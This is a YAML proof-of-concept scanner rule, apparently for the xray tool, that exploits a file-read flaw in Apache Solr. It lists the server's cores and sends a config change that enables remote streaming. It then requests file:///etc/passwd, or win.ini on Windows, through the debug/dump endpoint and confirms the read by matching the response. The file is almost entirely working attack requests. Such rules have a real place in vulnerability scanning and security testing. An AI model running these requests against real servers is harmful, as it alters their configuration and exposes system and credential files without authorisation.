name: poc-yaml-solr-fileread
manual: true
transport: http
rules:
    linux0:
        request:
            cache: true
            method: GET
            path: /solr/admin/cores?indexInfo=false&wt=json
        expression: response.status == 200 && response.body.bcontains(b"responseHeader")
        output:
            search: '"\"name\":\"(?P<core>.+?)\"".bsubmatch(response.body)'
            core: search["core"]
    linux1:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/config
            body: |
                {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
        expression: response.body.bcontains(b"responseHeader")
    linux2:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/debug/dump?param=ContentStreams
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                stream.url=file:///etc/passwd
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    windows0:
        request:
            cache: true
            method: GET
            path: /solr/admin/cores?indexInfo=false&wt=json
        expression: "true"
        output:
            search: '"\"name\":\"(?P<core>.+?)\"".bsubmatch(response.body)'
            core: search["core"]
    windows1:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/config
            body: |
                {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
        expression: response.body.bcontains(b"responseHeader")
    windows2:
        request:
            cache: true
            method: POST
            path: /solr/{{core}}/debug/dump?param=ContentStreams
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: |
                stream.url=file:///c://windows/win.ini
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: linux0() && linux1() && linux2() || windows0() && windows1() && windows2()
detail:
    author: whami-root(https://github.com/whami-root)
    links:
        - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186
